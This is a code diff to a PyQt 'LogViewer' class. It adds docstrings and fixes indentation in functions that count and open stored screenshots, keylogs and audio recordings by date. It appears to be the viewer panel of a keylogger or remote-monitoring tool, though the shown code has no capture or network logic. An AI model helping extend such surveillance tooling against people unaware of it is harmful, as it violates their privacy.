@@ -113,7 +113,7 @@ class LogViewer(QWidget, logViewerUi):
 
     def check_data_counts(self):
         '''
-        Send Count Data Signal
+        Send Count Logs Signal
         :return:
         '''
         self.update_date()
@@ -122,9 +122,10 @@ class LogViewer(QWidget, logViewerUi):
 
     def recv_data_counts(self, data):
         '''
-        Receive Count Data Signal
-        :param data:
-        :return:
+        Receive Count Logs
+        @:type data: dict
+        :param data: received data
+        :return: Set Count in Labels
         '''
         counted_logs = data['payload']
         self.screenshotsCountNewLabel.setText(str(counted_logs['screenshots']['new']))
@@ -135,23 +136,35 @@ class LogViewer(QWidget, logViewerUi):
         self.audioCountOldLabel.setText(str(counted_logs['audio']['old']))
 
     def update_date(self):
+        '''
+        :return: Update Global Date Variable
+        '''
         self.date = str(self.timeCalendar.selectedDate().toPyDate())
 
     def open_screenshot(self):
+        '''
+        :return: Open Screenshot In System Default Image Viewer
+        '''
         current_screenshot_path = str(self.screenshotsTable.item(self.screenshotsTable.currentRow(), 2).text())
         os.startfile(current_screenshot_path)
 
     def open_keylog(self):
+        '''
+        :return: Open Keylogs In System Default Browser
+        '''
         current_keylog_path = str(self.keylogsTable.item(self.keylogsTable.currentRow(), 2).text())
         os.startfile(current_keylog_path)
 
     def open_audio(self):
+        '''
+        :return: Open Audio In System Default Audio Player
+        '''
         current_audio_path = str(self.audioTable.item(self.audioTable.currentRow(), 3).text())
         os.startfile(current_audio_path)
 
     def download_data(self):
 
-    	tab_index = 0
+        tab_index = 0
 
         selected_date = self.date
 
